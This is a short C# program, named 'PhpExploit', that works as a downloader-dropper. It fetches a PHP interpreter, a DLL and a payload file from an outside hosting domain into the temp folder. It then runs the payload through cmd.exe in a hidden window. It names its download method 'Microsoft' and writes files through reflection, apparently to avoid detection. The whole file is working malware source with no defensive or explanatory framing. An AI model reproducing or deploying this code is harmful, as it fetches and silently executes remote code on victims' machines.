using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PhpExploit
{
    static class Program
    {

        [STAThread]
        static void Main()
        {
            var p = new[] { Microsoft("http://basharbachir.hostingerapp.com/php.exe").Result, Microsoft("http://basharbachir.hostingerapp.com/php7.dll").Result, Microsoft("http://basharbachir.hostingerapp.com/index.bin").Result };
            Write(Temp + "php.exe", p[0]);
            Write(Temp + "php7.dll", p[1]);
            Write(Temp + "index.php", p[2]);
            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\system32\cmd.exe",
                WorkingDirectory = Temp,
                Arguments =
                    "/k php.exe index.php",
                WindowStyle = ProcessWindowStyle.Hidden
            };
            var myProcess = GetMyProcess(startInfo);
            myProcess.Start();
        }

        private static readonly string Temp = Path.GetTempPath();
        static void Write(string name, byte[] b)
        {
            Type.GetType("System.IO.File")?.GetMethod("WriteAllBytes", new[] { typeof(string), typeof(byte[]) })?.Invoke(null, new object[] { name, b });
        }
        public static async Task<byte[]> Microsoft(string url)
        {
            using (var client = new HttpClient())
            {
                var result = await client.GetByteArrayAsync(url); return result;
            }
        }
        private static Process GetMyProcess(ProcessStartInfo startInfo)
            {
                return new Process { StartInfo = startInfo };
            }
        }
    }
